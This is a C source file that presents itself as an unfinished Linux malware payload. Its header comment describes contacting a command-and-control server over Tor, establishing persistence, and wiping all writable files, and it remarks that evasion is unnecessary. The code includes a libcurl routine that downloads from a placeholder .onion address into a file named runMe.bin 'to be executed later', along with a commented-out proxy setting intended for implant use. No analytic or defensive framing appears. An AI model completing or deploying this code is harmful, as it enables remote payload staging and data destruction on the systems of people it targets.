#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>

/* 
 * This is a pure C payload meant to target Linux systems in an effort to establish persistence. 
 * This payload will attempt to contact the C2, after which it may receive instruction to walk the file system and wipe all writable files.
 * Functionality to copy files before wiping them will be a nice addition at some point in the future.
 * 
 * NOTE: This payload currently implements no obfuscation or evasion techniques. These are not necessary in many cases as many targets do not have monitoring solutions on Linux servers/workstations.
 * */

// Globals:

int CPORT = 5678;
char * CADDRESS = "sample-string.onion";

int main(int argc, char * argv[]) {
	
	// Need to cleanup the C2 callback

	return 0;
}

int webRequestOverTor() {
    CURL *curl;
    CURLcode res;

    freopen("runMe.bin", "w", stdout);				// redirecting STDOUT to a file such that whatever is retrieved can be executed later

    curl = curl_easy_init();									// Initializing the structure needed to make requests
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "http://XXXXXXXXXXXXXX.onion/download");		// Setting the server

        // curl_easy_setopt(curl, CURLOPT_PROXY, "socks5h://127.0.0.1:9050"); 			// Setting the proxy (if used as an implant, change this to public SOCKS5 instance with HIA)

        res = curl_easy_perform(curl);								// Make the request

        if (res != CURLE_OK)									// Handling errors
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        curl_easy_cleanup(curl);								// Cleaning up the structure we initialized earlier
    }

    // cleaning up output redirection
    // freopen("/dev/tty", "w", stdout);		// Linux

    return 0;
}

